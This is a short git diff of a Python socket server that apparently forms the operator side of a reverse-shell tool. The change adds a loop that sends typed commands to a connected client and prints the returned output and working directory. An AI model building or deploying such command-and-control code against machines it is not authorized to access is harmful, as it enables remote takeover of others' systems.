@@ -1,5 +1,6 @@
 import socket, os
 from colorama import *
+from time import sleep
 from os import system, getenv, name
 ## set the clear command by os name
 windows = False
@@ -68,9 +69,24 @@ class Server:
         client_socket, client_address = s.accept()
         print(f"{success}{cyan}{client_address[0]}:{client_address[1]} Connected")
         currentWorkingDirectory = client_socket.recv(BUFFER_SIZE).decode()
-        cmd = input(f"{cyan}{currentWorkingDirectory} $> ")
+        while True:
 
-        if not cmd.strip():
-            pass
-        client_socket.send(cmd.encode())
+            cmd = input(f"{cyan}{currentWorkingDirectory} $> ")
 
+            if not cmd.strip():
+                continue
+            client_socket.send(cmd.encode())
+            if cmd.lower() == "exit":
+                break
+            output = client_socket.recv(BUFFER_SIZE).decode()
+            print(f"{cyan}---> {magenta}{output}{reset}")
+            results, currentWorkingDirectory = output.split()
+
+            print(results)
+
+        client_socket.close()
+        print(f"{attention}Client connection closed")
+        s.close()
+        print(f"{attention}Server closed")
+        print(f"{info}Go back to menu...")
+        sleep(3)
